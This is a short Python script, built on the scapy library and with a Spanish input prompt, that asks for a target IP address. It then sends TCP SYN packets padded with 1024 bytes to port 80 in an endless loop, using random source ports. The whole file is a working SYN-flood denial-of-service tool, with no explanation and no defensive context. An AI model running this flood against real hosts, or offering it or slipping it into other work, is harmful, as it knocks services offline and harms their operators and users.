from scapy.all import *

ip=input("Ingresa la ip \n >")
port=80
ip=IP(dst=ip)
tcp=TCP(sport=RandShort(), dport=port,flags="S")

raw=Raw(b"X"*1024)
p=ip/tcp/raw
send(p,loop=1,verbose=1)